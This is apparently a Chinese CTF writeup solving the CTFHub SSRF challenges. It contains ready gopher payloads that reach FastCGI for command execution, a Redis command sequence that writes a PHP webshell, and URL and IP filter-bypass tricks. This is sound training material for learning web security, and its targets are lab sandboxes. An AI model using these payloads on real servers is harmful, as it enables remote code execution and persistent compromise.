---
# 这是页面的图标
icon: token
# 这是文章的标题
title: CTFHub-SSRF-Writeup
# 设置作者
author: lhz
# 设置写作时间
time: 2021-08-24
# 一个页面只能有一个分类
category: CTF
# 一个页面可以有多个标签
tag:
  - writeup
  - ctfhub
  - ssrf

comment: false
typora-root-url: ..\..\..\.vuepress\public
---

## SSRF
  ![ssrf](/assets/img/ctf/ssrf.png)
### 内网访问
  直接构造访问请求,获取flag
  ```
  /?url=127.0.0.1/flag.php
  ```
### 伪协议读取文件
  根据题目提示使用file://协议，尝试一般web目录/var/www/html/  
  ![file](/assets/img/ctf/file.png)
### 端口扫描
  提示端口范围8000到9000
  ```url
  /?url=127.0.0.1:8000
  ```
  使用burpsuite对端口进行爆破，即可得到端口，访问获取flag
### POST请求  
  访问/?url=127.0.0.1/flag.ph,返回页面  
  ![post1](/assets/img/ctf/post1.png)  
  包含一个form和隐藏的key，推测需要在form中提交key，F12添加提交按钮  

  ```
  <input type="submit" name="sbumit">
  ```
  ![post3](/assets/img/ctf/post3.png)  
  在页面上提交key，页面返回"Just View From 127.0.0.1"  
  ![post5](/assets/img/ctf/post5.png)  
  可见需要通过SSRF提交请求，构造POST请求
  ```
    POST /flag.php HTTP/1.1
    Host: 127.0.0.1:80
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 36

    key=99cb8729f8a7ba5dcaa367dc092c2f2c
  ```
  因为通过SSRF，需要进行两次请求，所以对请求数据进行2次url编码，注意使用CRLF，第一次url编码后需要将%0A替换为%0D%0A,最后得到请求数据  
  ```
​    POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D99cb8729f8a7ba5dcaa367dc092c2f2c
  ```
  使用gopher发送请求，gopher协议是SSRF中常用的一个协议：
  ```url
  gopher://IP:port/_{TCP/IP数据流}
  ```
​    得到flag   
​    ![post4](/assets/img/ctf/post4.png)

### 文件上传
  使用file协议查看flag.php，代码检查了上传ip和文件大小，所以需要从127.0.0.1上传非空文件
  ```php html
  <?php
  error_reporting(0);
  if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){
      echo "Just View From 127.0.0.1";
      return;
  }
  if(isset($_FILES["file"]) && $_FILES["file"]["size"] > 0){
      echo getenv("CTFHUB");
      exit;
  }
  ?>
  Upload Webshell
  <form action="/flag.php" method="post" enctype="multipart/form-data">
      <input type="file" name="file">
  </form>
  ```

  访问`/?url=127.0.0.1/flag.php`，返回一个文件上传form，根据题意需要提交文件获取flag，F12添加提交按钮  
  ![upload1](/assets/img/ctf/upload1.png)  
  提交一个随意非空文件，抓取上传数据包，修改host为127.0.0.1:80  
  ![upload2](/assets/img/ctf/upload2.png)  
  对上传数据进行二次url编码，注意第一次编码后将%0A替换为%0D%0A，得到编码后的请求数据  

  ```
  POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520280%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F92.0.4515.159%2520Safari%252F537.36%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250ACookie%253A%2520UM_distinctid%253D17b2f471020f2e-06f3628e7e7e6e-4343363-1fa400-17b2f47102110f5%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522123.txt%2522%250D%250AContent-Type%253A%2520text%252Fplain%250D%250A%250D%250A123%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522123%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa--
  ```
  使用gopher发送请求，得到flag  
  ![upload3](/assets/img/ctf/upload3.png)
### FastCGI协议
  [fastcgi相关介绍](https://blog.csdn.net/mysteryflower/article/details/94386461)  
  [gopher payload工具](https://github.com/tarunkant/Gopherus)  
  使用gopherus工具生成payload，运行命令`ls /`  
  ![fastcgi1](/assets/img/ctf/fastcgi1.png)   
  进行url编码后得到提交payload  
  ```url
  gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2504%2500%253C%253Fphp%2520system%2528%2527ls%2520%2F%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
  ```
  发送请求，获取`/`下目录情况,发现flag文件  
  ![fastcgi2](/assets/img/ctf/fastcgi2.png)    
  使用gopherus工具生成payload，运行命令`cat /flag_14e0ba551d369f7992793e0b62395dc5`   
  ![fastcgi3](/assets/img/ctf/fastcgi3.png)   
  进行url编码后得到提交payload    
  ```url
  gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_14e0ba551d369f7992793e0b62395dc5%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
  ```
  发送请求，获得flag  
  ![fastcgi4](/assets/img/ctf/fastcgi4.png)

### Redis协议
  [浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)  
  redis写shell命令如下
  ```shell
  flushall
  set 1 '<?php eval($_GET["feng"]);?>'
  config set dir /var/www/html
  config set dbfilename feng.php
  save
  ```
  使用gopherus工具生成redis攻击payload  
  ![redis1](/assets/img/ctf/redis1.png)  
  进行url编码得到请求payload
  ```
  gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
  ```
  请求后生成一句话shell.php文件，利用参数cmd，构造请求`/shell.php?cmd=ls%20/`  
  ![redis2](/assets/img/ctf/redis2.png)  
  获取flag文件，再构造请求`/shell.php?cmd=cat%20/flag_1d41ab57dcc1507d5d99e103cdca52da`,获得flag  
  ![redis3](/assets/img/ctf/redis3.png)  
### URL Bypasss
  访问地址提示"start with `http://notfound.ctfhub.com`", 所以需要以`http://notfound.ctfhub.com`开头，构造访问url如下获取flag
  ```url
  /?url=http://notfound.ctfhub.com@127.0.0.1/flag.php
  ```
### 数字IP Bypass
  题目提示ban掉了127以及172.不能使用点分十进制的IP，但是又要访问127.0.0.1
  - 方法一：  
  使用localhost代替127.0.0.1,构造请求url如下，获取flag
  ```url
  /?url=http://localhost/flag.php
  ```
  - 方法二:  
  将127.0.0.1转换为16进制0x7F000001,构造请求url如下，获取flag
  ```url
  /?url=http://0x7F000001/flag.php
  ```  

### 302跳转 Bypass
  题目提示过滤了127.0.0.1，使用[数字IP Bypass](#数字ip-bypass)可以绕过，但是题意是使用302跳转绕过，可以生成短链接302跳转获得flag,  [短链接生成网站](https://my5353.com/)  
  ![短链接访问](/assets/img/ctf/302.png)
### DNS重绑定
  [DNS重绑定漏洞](https://zhuanlan.zhihu.com/p/89426041)  
  使用file://协议查看flag.php查看代码发现过滤了`/127|172|10|192/`开头，可以用16进制方式绕过，但是考虑到题目要求使用DNS重绑定  
  使用[rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html)获取域名  
  ![dns1](/assets/img/ctf/dns1.png)  
  访问或取flag  
  ![dns2](/assets/img/ctf/dns2.png)
